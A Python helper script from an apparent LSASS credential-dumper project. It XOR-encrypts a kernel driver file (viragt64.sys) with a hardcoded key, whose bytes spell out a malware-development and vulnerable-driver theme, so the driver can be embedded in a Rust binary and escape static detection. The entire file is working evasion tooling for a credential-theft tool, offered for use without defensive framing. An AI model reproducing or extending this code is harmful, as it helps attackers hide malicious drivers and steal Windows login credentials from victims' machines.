"""
XOR-encrypt a driver file for embedding into the lsass-dumper binary.

Usage:
    python encrypt_driver.py viragt64.sys

Outputs: viragt64.sys.enc (XOR-encrypted with hardcoded key)
The key and encrypted bytes are designed to be included via include_bytes!()
"""

import sys
import os

# Same XOR key used in the Rust decryption code
KEY = bytes([
    0x4D, 0x61, 0x6C, 0x77, 0x61, 0x72, 0x65, 0x44,
    0x65, 0x76, 0x52, 0x75, 0x73, 0x74, 0x32, 0x30,
    0x32, 0x36, 0x42, 0x59, 0x4F, 0x56, 0x44, 0x4B,
    0x65, 0x72, 0x6E, 0x65, 0x6C, 0x52, 0x57, 0x21,
])

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <driver.sys>")
        sys.exit(1)

    input_path = sys.argv[1]
    output_path = input_path + ".enc"

    with open(input_path, "rb") as f:
        plaintext = f.read()

    encrypted = xor_encrypt(plaintext, KEY)

    with open(output_path, "wb") as f:
        f.write(encrypted)

    print(f"[+] Encrypted {len(plaintext)} bytes")
    print(f"[+] Key (32 bytes): {KEY.hex()}")
    print(f"[+] Output: {output_path}")
    print(f"[+] Add to your Rust code:")
    print(f'    const DRIVER_ENC: &[u8] = include_bytes!("{os.path.basename(output_path)}");')

if __name__ == "__main__":
    main()
